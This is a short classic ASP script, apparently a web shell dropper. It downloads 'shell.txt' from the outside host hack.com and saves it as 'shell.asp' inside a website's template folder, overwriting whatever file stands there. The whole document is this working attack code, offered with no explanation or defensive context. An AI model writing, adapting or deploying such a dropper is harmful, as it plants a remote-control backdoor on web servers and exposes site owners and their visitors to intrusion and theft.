<%
Set xPost = createObject("Microsoft.XMLHTTP")
 xPost.Open "GET","http://hack.com/shell.txt",0
 xPost.Send()
 Set sGet = createObject("ADODB.Stream")
 sGet.Mode = 3
 sGet.Type = 1
 sGet.Open()
 sGet.Write(xPost.responseBody)
 sGet.SaveToFile "D:\website\jingsheng\Templates\heise\html\shell.asp",2  
 %>